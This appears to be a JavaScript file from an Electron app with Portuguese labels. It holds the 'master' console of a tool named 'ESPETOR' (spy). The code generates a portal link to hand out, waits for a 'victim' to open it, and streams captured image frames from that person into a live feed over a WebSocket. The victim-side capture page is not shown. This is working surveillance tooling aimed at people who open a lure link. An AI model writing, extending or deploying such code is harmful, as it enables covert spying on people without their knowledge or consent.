// ═══════════ ESPETOR (WebSocket Stream) ═══════════
let spectreWs = null;

// Ao carregar, busca o IP e injeta na interface de cópia
window.electronAPI.getLocalIp().then(ip => {
    const spectreLinkCode = document.getElementById('spectre-link');
    if (spectreLinkCode) {
        spectreLinkCode.innerText = `http://${ip}:8080/portal.html`;
        spectreLinkCode.dataset.url = `http://${ip}:8080/portal.html`;
        spectreLinkCode.dataset.ip = ip;
    }
});

document.getElementById('btn-copy-spectre')?.addEventListener('click', () => {
    const url = document.getElementById('spectre-link')?.dataset.url;
    if (url) {
        navigator.clipboard.writeText(url);
        const btn = document.getElementById('btn-copy-spectre');
        btn.innerText = "Copiado!";
        setTimeout(() => btn.innerText = "Copiar URL", 2000);
    }
});

document.getElementById('btn-start-spectre')?.addEventListener('click', () => {
    const ip = document.getElementById('spectre-link')?.dataset.ip || '127.0.0.1';
    const wsUrl = `ws://${ip}:8080/ws/spectre?role=master`;
    
    if (spectreWs) spectreWs.close();
    
    document.getElementById('spectre-idle').innerText = "Conectando ao Core Engine...";
    
    spectreWs = new WebSocket(wsUrl);
    
    spectreWs.onopen = () => {
        document.getElementById('spectre-idle').innerText = "Monitor Online. Aguardando Vítima acessar o Link...";
        document.getElementById('spectre-idle').style.color = "var(--green)";
        term.writeln(`\r\n\x1b[35m[spectre]\x1b[0m Console mestre conectado. Monitorando pacotes de imagem...`);
    };
    
    spectreWs.onmessage = (event) => {
        try {
            const payload = JSON.parse(event.data);
            if (payload.type === 'frame' && payload.data) {
                // Esconde a label idle
                document.getElementById('spectre-idle').style.display = 'none';
                
                // Pinta o frame no Img
                const feedImg = document.getElementById('spectre-feed');
                feedImg.src = payload.data;
                feedImg.style.display = 'block';
            }
        } catch(e) {}
    };
    
    spectreWs.onerror = () => {
        document.getElementById('spectre-idle').innerText = "Erro ao conectar. O Motor Core está online?";
        document.getElementById('spectre-idle').style.color = "var(--red)";
    };
    
    spectreWs.onclose = () => {
        document.getElementById('spectre-idle').innerText = "Conexão encerrada.";
        document.getElementById('spectre-idle').style.color = "var(--text-3)";
        document.getElementById('spectre-idle').style.display = 'block';
        document.getElementById('spectre-feed').style.display = 'none';
    };
});
